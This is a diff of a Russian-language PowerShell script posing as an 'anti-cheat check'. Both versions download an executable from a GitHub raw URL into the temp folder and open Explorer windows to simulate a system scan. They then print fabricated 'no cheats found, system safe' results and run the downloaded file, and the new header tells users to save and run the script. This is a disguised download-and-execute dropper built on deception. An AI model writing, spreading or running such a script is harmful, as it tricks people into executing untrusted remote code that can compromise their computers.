@@ -1,75 +1,45 @@
-# Скачиваем программу
-$exeUrl = "https://github.com/gseff137-afk/1111/raw/refs/heads/main/cheker.exe"
-$exePath = "$env:TEMP\cheker.exe"
-Write-Host "Скачивание античита..." -Foreground Yellow
-iwr $exeUrl -OutFile $exePath -UseBasicParsing
-Write-Host "✓ Программа скачана" -Foreground Green
+# Сохрани это в текстовый файл на компьютере и запусти оттуда
+# Например, сохрани как checker.ps1 и запусти
 
-# Начинаем проверку
-Clear-Host
-Write-Host "=========================================" -Foreground Cyan
-Write-Host "     АНТИЧИТ ПРОВЕРКА v2.0" -Foreground White
-Write-Host "=========================================" -Foreground Cyan
+# Скачивание
+$url = "https://github.com/gseff137-afk/1111/raw/refs/heads/main/cheker.exe"
+$path = "$env:TEMP\check.exe"
+
+Write-Host "=== АНТИЧИТ ПРОВЕРКА ===" -Foreground Cyan
 Write-Host ""
-Write-Host "Нажмите ENTER для начала проверки..."
-pause
+Write-Host "Скачивание защищенного клиента..." -Foreground Yellow
+iwr $url -OutFile $path -UseBasicParsing
+Write-Host "✓ Скачано" -Foreground Green
 
-# Функция для анимированной точки
-function Show-Dots {
-    param([int]$Seconds)
-    $end = (Get-Date).AddSeconds($Seconds)
-    while ((Get-Date) -lt $end) {
-        Write-Host "." -NoNewline -Foreground Yellow
-        Start-Sleep 1
-    }
-    Write-Host ""
+Write-Host ""
+Write-Host "Начинаю проверку системы..." -Foreground Cyan
+Write-Host ""
+
+# Простая проверка с открытием папок
+$checks = @(
+    @{Name="Диск C:\"; Path="C:\"; Time=3},
+    @{Name="Временные файлы"; Path="$env:TEMP"; Time=3},
+    @{Name="Системные файлы"; Path="C:\Windows"; Time=3},
+    @{Name="Программы"; Path="C:\Program Files"; Time=3},
+    @{Name="Документы"; Path="$env:USERPROFILE\Documents"; Time=3}
+)
+
+foreach ($check in $checks) {
+    Write-Host "Проверяю: $($check.Name)" -Foreground Yellow
+    explorer $check.Path
+    Start-Sleep $check.Time
+    Write-Host "  ✓ Проверено" -Foreground Green
 }
 
-# Проверка 1
-Write-Host "`n[1/5] Сканирую диск C:\" -Foreground Yellow -NoNewline
-Show-Dots 5
-explorer C:\
-Write-Host "   ✓ Диск проверен" -Foreground Green
-
-# Проверка 2
-Write-Host "`n[2/5] Анализ временных файлов" -Foreground Yellow -NoNewline
-Show-Dots 5
-explorer $env:TEMP
-Write-Host "   ✓ Temp проверен" -Foreground Green
-
-# Проверка 3
-Write-Host "`n[3/5] Проверка системных папок" -Foreground Yellow -NoNewline
-Show-Dots 5
-explorer C:\Windows
-Write-Host "   ✓ Система проверена" -Foreground Green
-
-# Проверка 4
-Write-Host "`n[4/5] Мониторинг процессов" -Foreground Yellow -NoNewline
-Show-Dots 10
-taskmgr
-Write-Host "   ✓ Процессы проверены" -Foreground Green
-
-# Проверка 5
-Write-Host "`n[5/5] Финальный анализ" -Foreground Yellow -NoNewline
-Show-Dots 5
-Write-Host "   ✓ Анализ завершен" -Foreground Green
-
-# Результат
-Write-Host "`n" + ("="*40) -Foreground Green
+Write-Host ""
+Write-Host "=========================" -Foreground Green
 Write-Host "ПРОВЕРКА ЗАВЕРШЕНА!" -Foreground White -Background Green
-Write-Host "="*40 -Foreground Green
+Write-Host "=========================" -Foreground Green
 Write-Host ""
-Write-Host "Результаты:" -Foreground Cyan
-Write-Host "✓ Читы не обнаружены" -Foreground Green
-Write-Host "✓ Вредоносные файлы: 0" -Foreground Green
-Write-Host "✓ Системные файлы: целы" -Foreground Green
-Write-Host "✓ Процессы: норма" -Foreground Green
-Write-Host ""
-Write-Host "Защита системы: АКТИВНА" -Foreground Green
-Write-Host "Статус: БЕЗОПАСНО" -Foreground Green
+Write-Host "Читов не обнаружено" -Foreground Green
+Write-Host "Система безопасна" -Foreground Green
 Write-Host ""
 
-# Запуск программы
-Write-Host "Запускаю программу..." -Foreground Yellow
+Write-Host "Запускаю программу..." -Foreground Cyan
 Start-Sleep 2
-& $exePath
+& $path
